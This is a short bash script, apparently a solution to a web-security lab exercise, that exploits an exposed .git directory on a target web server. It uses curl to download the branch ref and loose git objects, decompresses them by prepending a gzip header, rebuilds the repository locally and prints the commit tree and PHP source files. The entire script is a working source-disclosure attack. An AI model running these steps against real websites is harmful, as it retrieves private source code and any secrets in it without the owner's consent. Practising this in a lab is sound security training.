#!/bin/bash

# c434d630e0588d77db7bd5e8447384c54998166c
curl https://ptl-d4c82f02-4ac502aa.libcurl.so/.git/refs/heads/master

# the first 2 letters id the containing folder
curl https://ptl-d4c82f02-4ac502aa.libcurl.so/.git/objects/c4/34d630e0588d77db7bd5e8447384c54998166c -O 34d630e0588d77db7bd5e8447384c54998166c

# 34d630e0588d77db7bd5e8447384c54998166c: zlib compressed data
file 34d630e0588d77db7bd5e8447384c54998166c

# gzip: 34d630e0588d77db7bd5e8447384c54998166c: unknown suffix -- ignored
gunzip 34d630e0588d77db7bd5e8447384c54998166c

# add the matching header
printf "\x1f\x8b\x08\x00\x00\x00\x00\x00" | cat - 34d630e0588d77db7bd5e8447384c54998166c | gzip  -cd -q

# fetch the newly discovered commit and unpack it
curl https://ptl-d4c82f02-4ac502aa.libcurl.so/.git/objects/58/ace0476093d04023f84d7816adacfa7b879c43 -O ace0476093d04023f84d7816adacfa7b879c43
printf "\x1f\x8b\x08\x00\x00\x00\x00\x00" | cat - ace0476093d04023f84d7816adacfa7b879c43 | gzip  -cd -q | xxd

# recreate the repo
git init
mv 34d630e0588d77db7bd5e8447384c54998166c .git/objects/c4/
mv ace0476093d04023f84d7816adacfa7b879c43 .git/objects/58/
git cat-file -p 58ace0476093d04023f84d7816adacfa7b879c43

# 040000 tree b352dde43705f193d2c1d4e6f6a133321186869f	css
# 100644 blob f303c6a7797f5e7a0d5bd31d39a7149366bbf873	favicon.ico
# 100644 blob 5adab1a1c52dc009d4f26bbce30dacc4c93eea33	footer.php
# 100644 blob c3646db7f9c7e6f126c75900fdcce16d50e1da82	header.php
# 100644 blob 88beb94b5e1fc48e1625c89f892b04bffb58225c	index.php

# download the new files
curl https://ptl-d4c82f02-4ac502aa.libcurl.so/.git/objects/5a/dab1a1c52dc009d4f26bbce30dacc4c93eea33 -O dab1a1c52dc009d4f26bbce30dacc4c93eea33
curl https://ptl-d4c82f02-4ac502aa.libcurl.so/.git/objects/c3/646db7f9c7e6f126c75900fdcce16d50e1da82 -O 646db7f9c7e6f126c75900fdcce16d50e1da82
curl https://ptl-d4c82f02-4ac502aa.libcurl.so/.git/objects/88/beb94b5e1fc48e1625c89f892b04bffb58225c -O beb94b5e1fc48e1625c89f892b04bffb58225c

# output the commits
git cat-file -p c3646db7f9c7e6f126c75900fdcce16d50e1da82